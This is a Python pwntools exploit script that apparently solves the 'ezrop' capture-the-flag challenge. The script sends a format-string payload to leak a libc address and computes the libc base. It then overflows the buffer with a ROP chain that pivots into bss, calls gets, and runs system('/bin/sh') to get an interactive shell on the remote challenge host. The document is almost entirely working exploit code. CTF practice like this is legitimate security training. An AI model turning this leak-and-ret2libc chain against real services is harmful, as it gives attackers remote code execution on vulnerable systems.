#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import os

from pwn import *

elf = context.binary = ELF("./ezrop_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc challenge19.play.potluckctf.com 31337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}


def exec_fmt(fmt_payload, identifier=b"END"):
    with context.quiet:
        io = start()
    if not args.REMOTE:
        os.system(f"cat /proc/{io.pid}/maps | rg 'libc'")
    payload = fmt_payload
    payload = payload.ljust(0x20, b"\x00")
    payload += flat(
        elf.bss(0xc00),
        elf.sym["vuln"] + 0x13,
    )
    io.sendlineafter(b"name: ", payload)
    resp = io.recvuntil(identifier, drop=True)
    with context.quiet:
        io.close()
    return resp


# for i in range(1, 32):
#     leak = exec_fmt(f"%{i}$p|||".encode(), b"|||")
#     log.info(f"{i}: {leak}")
#     print()

io = start()
payload = b"%3$p|||"
payload = payload.ljust(0x20, b"\x00")
payload += flat(
    elf.bss(0xc00),
    elf.sym["vuln"] + 0x13,
)
io.sendlineafter(b"name: ", payload)
leak = int(io.recvuntil(b"|||", drop=True), 16)
libc.address = leak - libc.sym["_IO_2_1_stdin_"]
log.info(f"{libc.address=:#x}")

payload = b"A" * 0x20
payload += flat(
    elf.bss(0xc00),
    elf.plt["gets"],
    libc.sym["system"]
)
io.sendline(payload)
pause()
io.sendline(b"//////bin/sh\x00")
io.interactive()
